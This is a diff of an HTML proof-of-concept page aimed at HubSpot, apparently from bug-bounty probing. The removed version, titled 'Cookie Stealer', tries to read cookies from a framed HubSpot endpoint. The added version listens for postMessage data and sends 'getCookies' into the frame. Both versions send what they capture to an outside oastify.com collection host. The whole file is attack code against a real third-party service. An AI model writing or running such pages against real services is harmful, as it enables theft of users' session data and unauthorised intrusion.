@@ -1,30 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cookie Stealer</title>
+    <title>HubSpot PostMessage Exploit</title>
 </head>
 <body>
-    <iframe id="hsFrame" src="https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth" style="display:none;"></iframe>
-    <script>
-    // This only works if HubSpot allows framing (which they probably don't)
-    // و معمولاً به خاطر SameSite=Lax کار نمی‌کند
+    <h1>PostMessage Test</h1>
+    <iframe id="hsFrame" src="https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth" sandbox="allow-scripts allow-same-origin"></iframe>
     
-    document.getElementById('hsFrame').onload = function() {
-        try {
-            var frame = document.getElementById('hsFrame');
-            var cookies = frame.contentDocument.cookie;
+    <script>
+    // Listen for messages from HubSpot
+    window.addEventListener('message', function(event) {
+        if (event.origin === 'https://app.hubspot.com') {
+            console.log('Received message:', event.data);
             
+            // Send to Collaborator
             fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({cookies: cookies})
+                body: JSON.stringify({
+                    type: 'postmessage',
+                    data: event.data,
+                    origin: event.origin
+                })
             });
+        }
+    });
+    
+    // Try to send message to HubSpot
+    var iframe = document.getElementById('hsFrame');
+    iframe.onload = function() {
+        try {
+            iframe.contentWindow.postMessage('getCookies', 'https://app.hubspot.com');
         } catch(e) {
-            console.log('Cannot access iframe:', e);
+            console.log('PostMessage error:', e);
         }
     };
     </script>
 </body>
 </html>
-
 
